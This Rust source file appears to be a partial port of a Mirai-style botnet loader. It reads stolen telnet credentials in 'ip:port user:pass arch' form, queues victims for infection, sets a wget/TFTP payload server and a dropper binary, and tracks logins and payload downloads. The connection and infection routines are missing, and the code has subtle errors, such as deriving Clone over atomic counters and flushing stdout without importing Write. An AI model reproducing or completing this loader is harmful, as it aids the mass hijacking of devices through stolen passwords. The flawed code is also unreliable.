use std::env;
use std::ffi::CString;
use std::net::{Ipv4Addr, SocketAddrV4};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use std::io::{self, BufRead};
use std::net::TcpListener;
use std::os::unix::prelude::RawFd;
use std::collections::VecDeque;

#[derive(Debug, Clone)]
struct TelnetInfo {
    ip: Ipv4Addr,
    port: u16,
    user: String,
    pass: String,
    arch: String,
}

#[derive(Debug, Clone)]
struct Server {
    processors: usize,
    addrs: Vec<SocketAddrV4>,
    buffer_size: usize,
    wget_addr: String,
    wget_port: u16,
    tftp_addr: String,
    total_input: AtomicUsize,
    curr_open: AtomicUsize,
    total_logins: AtomicUsize,
    total_successes: AtomicUsize,
    total_echoes: AtomicUsize,
    total_wgets: AtomicUsize,
    total_tftps: AtomicUsize,
    queue: Arc<Mutex<VecDeque<TelnetInfo>>>,
}

impl Server {
    fn new(
        processors: usize,
        addrs: Vec<SocketAddrV4>,
        buffer_size: usize,
        wget_addr: &str,
        wget_port: u16,
        tftp_addr: &str,
    ) -> Arc<Self> {
        Arc::new(Server {
            processors,
            addrs,
            buffer_size,
            wget_addr: wget_addr.to_string(),
            wget_port,
            tftp_addr: tftp_addr.to_string(),
            total_input: AtomicUsize::new(0),
            curr_open: AtomicUsize::new(0),
            total_logins: AtomicUsize::new(0),
            total_successes: AtomicUsize::new(0),
            total_echoes: AtomicUsize::new(0),
            total_wgets: AtomicUsize::new(0),
            total_tftps: AtomicUsize::new(0),
            queue: Arc::new(Mutex::new(VecDeque::new())),
        })
    }

    fn queue_telnet(&self, info: TelnetInfo) {
        let mut queue = self.queue.lock().unwrap();
        queue.push_back(info);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    let id_tag = args.get(1).map_or("telnet", |s| &s[..]);

    let addrs = if cfg!(debug_assertions) {
        vec![SocketAddrV4::new(Ipv4Addr::new(0, 0, 0, 0), 0)]
    } else {
        vec![
            SocketAddrV4::new(Ipv4Addr::new(192, 168, 0, 1), 0),
            SocketAddrV4::new(Ipv4Addr::new(192, 168, 1, 1), 0),
        ]
    };

    if !binary_init() {
        println!("Failed to load bins/dlr.* as dropper");
        return;
    }

    let srv = Server::new(
        num_cpus::get(),
        addrs,
        1024 * 64,
        "100.200.100.100",
        80,
        "100.200.100.100",
    );

    let srv_clone = Arc::clone(&srv);
    thread::spawn(move || stats_thread(srv_clone));

    let stdin = io::stdin();
    let mut total = 0;
    let mut info = TelnetInfo {
        ip: Ipv4Addr::new(0, 0, 0, 0),
        port: 0,
        user: String::new(),
        pass: String::new(),
        arch: String::new(),
    };

    for line in stdin.lock().lines() {
        let line = line.expect("Failed to read line from stdin");
        let trimmed = line.trim();
        if trimmed.is_empty() {
            thread::sleep(Duration::from_millis(10));
            continue;
        }

        if let Some(parsed_info) = telnet_info_parse(trimmed) {
            info = parsed_info;

            srv.queue_telnet(info.clone());
            total += 1;
            if total % 1000 == 0 {
                thread::sleep(Duration::from_secs(1));
            }

            srv.total_input.fetch_add(1, Ordering::SeqCst);
        } else {
            println!(
                "Failed to parse telnet info: \"{}\" Format -> ip:port user:pass arch",
                trimmed
            );
        }
    }

    println!("Hit end of input.");

    while srv.curr_open.load(Ordering::SeqCst) > 0 {
        thread::sleep(Duration::from_secs(1));
    }
}

fn stats_thread(srv: Arc<Server>) {
    let mut seconds = 0;

    loop {
        println!(
            "{}s\tProcessed: {}\tConns: {}\tLogins: {}\tRan: {}\tEchoes: {}\tWgets: {}\tTFTPs: {}",
            seconds,
            srv.total_input.load(Ordering::SeqCst),
            srv.curr_open.load(Ordering::SeqCst),
            srv.total_logins.load(Ordering::SeqCst),
            srv.total_successes.load(Ordering::SeqCst),
            srv.total_echoes.load(Ordering::SeqCst),
            srv.total_wgets.load(Ordering::SeqCst),
            srv.total_tftps.load(Ordering::SeqCst),
        );

        io::stdout().flush().unwrap();
        thread::sleep(Duration::from_secs(1));
        seconds += 1;
    }
}

fn telnet_info_parse(info_str: &str) -> Option<TelnetInfo> {
    let parts: Vec<&str> = info_str.split_whitespace().collect();
    if parts.len() != 3 {
        return None;
    }

    let addr_parts: Vec<&str> = parts[0].split(':').collect();
    if addr_parts.len() != 2 {
        return None;
    }

    let ip = addr_parts[0].parse().ok()?;
    let port = addr_parts[1].parse().ok()?;
    let user_pass: Vec<&str> = parts[1].split(':').collect();
    if user_pass.len() != 2 {
        return None;
    }

    Some(TelnetInfo {
        ip,
        port,
        user: user_pass[0].to_string(),
        pass: user_pass[1].to_string(),
        arch: parts[2].to_string(),
    })
}

fn binary_init() -> bool {
    // Implement binary initialization logic here
    true
}
